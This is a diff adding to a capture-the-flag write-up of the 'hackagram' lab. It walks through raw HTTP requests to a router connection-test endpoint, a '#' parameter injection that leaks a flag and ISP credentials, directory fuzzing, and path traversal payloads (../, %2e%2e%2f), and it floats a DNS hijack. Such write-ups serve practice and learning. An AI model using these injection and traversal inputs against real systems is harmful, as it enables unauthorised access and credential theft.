@@ -237,4 +237,172 @@ So the first two are just IP's from digitalocean, but if I visit the last one in
 
 ![alt](./images/hackagram-04.png)
 
-Flag no.3 :)
+Flag no.3 :). So not a lot here, but the button does have an event registered to in a ./js/public.js file
+
+```javascript
+$('.connection-test').click( function(){
+    $.post('/connection-test',{ node: 'us1'},function(resp){
+        $('.connection-result').html('<div class="alert alert-success"><p>' + resp + '</p></div>');
+    }).fail( function(resp){
+        $('.connection-result').html('<div class="alert alert-danger"><p>' + resp.responseJSON[0] + '</p></div>');
+    });
+});
+```
+
+Which sends a POST request like so
+
+```
+POST /connection-test HTTP/1.1
+Host: 178.62.61.49
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 8
+Origin: http://178.62.61.49
+Connection: close
+Referer: http://178.62.61.49/
+
+node=us1
+```
+
+And gives back a JSON response
+
+```
+HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Thu, 16 Jun 2022 18:24:50 GMT
+Content-Type: application/json
+Connection: close
+Content-Length: 25
+
+["Connection Successful"]
+```
+
+So there's some node parameter. Is there more than one node and if so what are they called? I tried node = us1-100, but only 1 gave me back anything, the rest returned
+
+```
+["Connection Error"]
+```
+
+Removing the parameter entirely gives
+
+```
+["Missing Node"]
+```
+
+I could try the two character alpha, which I assume is a country such US for example. Let's generate a wordlist with all 2 letter combinations a-z
+
+```python
+import exrex
+
+combinations = list(exrex.generate('^[a-z]{2}$'))
+with open('patterns.txt', 'w') as wordlist:
+    wordlist.write('\n'.join(combinations))
+```
+
+And..... no 'us1' is still the only one which returns a success. Not that that tells me anything useful.
+
+Node sounded like it could also be an IP or hostname/subdomain. I tried localhost, 127.0.0.1 nothing. This thing claims it's a router, common IP's of a router 192.168.0.1/192.168.1.1
+
+Tried both, didn't work. Then I literally stumbled on adding a # to the value of 192.168.1.1 i.e. like this
+
+```
+POST /connection-test HTTP/1.1
+Host: 178.62.61.49
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 8
+Origin: http://178.62.61.49
+Connection: close
+Referer: http://178.62.61.49/
+
+node=192.168.1.1#
+```
+
+This gave me a response with HTML, with a few interesting things
+
+Flag 4
+```html
+<h3 class="text-center">[^FLAG^XXXXXX^FLAG^]</h3>
+```
+
+Connection settings with a username and password
+
+```html
+<div class="panel panel-default" style="margin-top:40px">
+    <div class="panel-heading">Connection Settings</div>
+    <div class="panel-body">
+        <div><label>Internet Username</label></div>
+        <div><input class="form-control" name="i_username" value="6422451584@fasternetbb.dsl"></div>
+        <div><label>Internet Password</label></div>
+        <div><input class="form-control" type="password" name="i_password" value="Bpi5!9fiLeikmeHmN"></div>
+        <div style="margin-top:15px"><input type="button" class="btn btn-success pull-right setConnection" value="Change Settings"></div>
+    </div>
+</div>
+```
+
+Oh look a private js file
+
+```html
+<script src="/js/private.js">
+```
+
+Content
+
+```javascript
+$('.setConnection').click( function(){
+    var username = $('input[name="i_username"]').val();
+    var password = $('input[name="i_password"]').val();
+    $.get('/set/connection?username=' + username +'&password=' + password ,function(resp){
+       alert(resp);
+    });
+});
+
+$('.setDNS').click( function(){
+    var server = $('input[name="dns_server"]').val();
+    $.get('/set/dns?server=' + server ,function(resp){
+        alert(resp);
+    });
+});
+```
+
+So I suspect that the DNS settings are the interesting bit! If I can hijack the settings to point to an evil DNS i.e. me perhaps that'll give me something. This isn't a technique I've used yet, time for research!
+
+So I don't have a VPS, and my home router doesn't seem to support port forwarding. I may have to leave this step for now, and perhaps this challenge. :(. At least until I setup a VPS or VPN to allow me to complete this.
+
+I am still missing a flags 1+2 so let me try and check that first.
+
+So remember ```https://www.googletagmaneger.com/event?e=xxx```, perhaps there are additional parameters I don't know about...
+
+YES! A hit on include (flag 1.) side note I'm now level with stok on the leaderboard with 37 flags for ctfchallenge :D
+
+![alt](./images/hackagram-05.png)
+
+OK so can I do some LFI or directory traversal? 
+
+Tried a number of things
+
+- Did some fuzzing with the content wordlist on the param value, 0 and @ seem to give a blank response with no error. Everything else gives the same warning
+- Tried a bit of path path traversal with ../, ..\\/, %2e%2e%2f, %252e%252e%252f. None of which worked as the / was stripped always
+- Tried accessing https://www.googletagmaneger.com/datacollection/controllers/Website.php, which gave a 404
+- Tried just with the IP of the site https://159.65.212.27/datacollection/controllers/Website.php, which gave a blank page
+
+So the last one gave something back so let's try a FUZZ on https://159.65.212.27/datacollection/FUZZ. And yes some hits
+
+- /datacollection/controllers
+- /datacollection/models
+- /datacollection/public
+- /datacollection/routes
+- /datacollection/ssl
+- /datacollection/templates
+
+ssl gives us the index of a directory including a flag (no. 2) and some certificate files...
+
+![alt](./images/hackagram-06.png)
